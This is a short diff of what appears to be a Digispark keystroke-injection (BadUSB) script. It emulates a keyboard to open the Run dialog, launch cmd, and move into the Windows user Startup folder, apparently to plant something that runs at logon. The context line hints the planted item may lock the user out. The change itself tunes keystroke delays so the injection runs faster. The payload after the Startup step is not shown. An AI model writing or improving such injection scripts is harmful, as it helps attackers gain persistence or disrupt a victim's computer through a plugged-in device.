@@ -8,9 +8,8 @@ You can remove it by signing in with another account and deleting it.
     DigiKeyboard.sendKeyStroke(0);
     DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-    DigiKeyboard.delay(800);
+    DigiKeyboard.delay(400);
     DigiKeyboard.print("cmd");
-    DigiKeyboard.delay(800);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(400);
     DigiKeyboard.print("cd / & cd Users & cd %AppData%/Microsoft/Windows/Start Menu/Programs/Startup");
